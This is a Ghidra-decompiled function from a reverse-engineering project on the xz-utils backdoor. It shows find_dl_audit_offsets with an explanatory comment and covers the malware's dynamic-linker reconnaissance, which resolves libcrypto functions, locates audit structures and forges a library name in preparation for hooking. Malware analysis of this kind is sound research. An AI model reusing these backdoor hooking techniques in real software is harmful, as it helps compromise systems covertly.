// /home/kali/xzre-ghidra/xzregh/1051E0_find_dl_audit_offsets.c
// Function: find_dl_audit_offsets @ 0x1051E0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_dl_audit_offsets(backdoor_data_handle_t * data, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Coordinates the entire ld.so reconnaissance pass. It resolves the necessary EC/EVP helpers via the fake allocator, copies `_dl_audit_symbind_alt`’s address/size out of ld.so, and uses `find_link_map_l_name` to compute the displacement between the cached and live link_map entries. With that offset it invokes `find_dl_naudit` to capture the `_dl_naudit`/`_dl_audit` pointers and `find_link_map_l_audit_any_plt` to learn where the audit bit lives. Finally it copies libcrypto’s basename into `hooks->ldso_ctx` so the forged `l_name` string looks correct. Any failure frees the temporary imports and aborts the audit-hook install path.
 */

#include "xzre_types.h"

BOOL find_dl_audit_offsets
               (backdoor_data_handle_t *data,ptrdiff_t *libname_offset,backdoor_hooks_data_t *hooks,
               imported_funcs_t *imported_funcs)

{
  uint uVar1;
  elf_info_t *peVar2;
  Elf64_Addr EVar3;
  Elf64_Ehdr *pEVar4;
  elf_handles_t *peVar5;
  u64 size;
  char **ppcVar6;
  char *pcVar7;
  BOOL BVar8;
  lzma_allocator *allocator;
  Elf64_Sym *pEVar9;
  pfn_EVP_PKEY_free_t ppVar10;
  pfn_EC_KEY_get0_group_t ppVar11;
  pfn_EVP_CIPHER_CTX_free_t ppVar12;
  long lVar13;
  uchar *vaddr;
  backdoor_hooks_data_t *pbVar14;
  byte bVar15;
  
  bVar15 = 0;
  BVar8 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x0,10,0,FALSE);
  if (BVar8 != FALSE) {
    allocator = get_lzma_allocator();
    peVar2 = data->elf_handles->libcrypto;
    allocator->opaque = peVar2;
    pEVar9 = elf_symbol_get(peVar2,STR_EC_POINT_point2oct,0);
    if (data->elf_handles->liblzma->gnurelro_found != FALSE) {
      if (pEVar9 != (Elf64_Sym *)0x0) {
        EVar3 = pEVar9->st_value;
        pEVar4 = data->elf_handles->libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EC_POINT_point2oct = (pfn_EC_POINT_point2oct_t)(pEVar4->e_ident + EVar3);
      }
      ppVar10 = (pfn_EVP_PKEY_free_t)lzma_alloc(0x6f8,allocator);
      imported_funcs->EVP_PKEY_free = ppVar10;
      if (ppVar10 != (pfn_EVP_PKEY_free_t)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      pEVar9 = elf_symbol_get(data->elf_handles->libcrypto,STR_EC_KEY_get0_public_key,0);
      ppVar11 = (pfn_EC_KEY_get0_group_t)lzma_alloc(0x7e8,allocator);
      imported_funcs->EC_KEY_get0_group = ppVar11;
      if (ppVar11 != (pfn_EC_KEY_get0_group_t)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      peVar5 = data->elf_handles;
      if (pEVar9 != (Elf64_Sym *)0x0) {
        EVar3 = pEVar9->st_value;
        pEVar4 = peVar5->libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EC_KEY_get0_public_key =
             (pfn_EC_KEY_get0_public_key_t)(pEVar4->e_ident + EVar3);
      }
      pEVar9 = elf_symbol_get(peVar5->dynamic_linker,STR_dl_audit_symbind_alt,0);
      if (pEVar9 != (Elf64_Sym *)0x0) {
        peVar2 = data->elf_handles->dynamic_linker;
        size = pEVar9->st_size;
        vaddr = peVar2->elfbase->e_ident + pEVar9->st_value;
        (hooks->ldso_ctx)._dl_audit_symbind_alt__size = size;
        (hooks->ldso_ctx)._dl_audit_symbind_alt = (dl_audit_symbind_alt_fn)vaddr;
        BVar8 = elf_contains_vaddr(peVar2,vaddr,size,4);
        if ((BVar8 != FALSE) &&
           (BVar8 = find_link_map_l_name(data,libname_offset,hooks,imported_funcs), BVar8 != FALSE))
        {
          ppVar12 = (pfn_EVP_CIPHER_CTX_free_t)lzma_alloc(0xb28,allocator);
          imported_funcs->EVP_CIPHER_CTX_free = ppVar12;
          if (ppVar12 != (pfn_EVP_CIPHER_CTX_free_t)0x0) {
            imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          }
          BVar8 = find_dl_naudit(data->elf_handles->dynamic_linker,data->elf_handles->libcrypto,
                                 hooks,imported_funcs);
          if ((BVar8 != FALSE) &&
             (BVar8 = find_link_map_l_audit_any_plt(data,*libname_offset,hooks,imported_funcs),
             BVar8 != FALSE)) {
            pbVar14 = hooks;
            for (lVar13 = 0x10; lVar13 != 0; lVar13 = lVar13 + -1) {
              (pbVar14->ldso_ctx)._unknown1459[0] = '\0';
              (pbVar14->ldso_ctx)._unknown1459[1] = '\0';
              (pbVar14->ldso_ctx)._unknown1459[2] = '\0';
              (pbVar14->ldso_ctx)._unknown1459[3] = '\0';
              pbVar14 = (backdoor_hooks_data_t *)((long)pbVar14 + (ulong)bVar15 * -8 + 4);
            }
            ppcVar6 = (hooks->ldso_ctx).libcrypto_l_name;
            uVar1 = *(uint *)(ppcVar6 + 1);
            if (uVar1 < 9) {
              if (uVar1 != 0) {
                pcVar7 = *ppcVar6;
                lVar13 = 0;
                do {
                  (hooks->ldso_ctx)._unknown1459[lVar13] = pcVar7[lVar13];
                  lVar13 = lVar13 + 1;
                } while ((ulong)uVar1 << 3 != lVar13);
              }
              return TRUE;
            }
          }
        }
      }
    }
    lzma_free(imported_funcs->EVP_PKEY_free,allocator);
    lzma_free(imported_funcs->EC_KEY_get0_group,allocator);
    lzma_free(imported_funcs->EVP_CIPHER_CTX_free,allocator);
  }
  return FALSE;
}

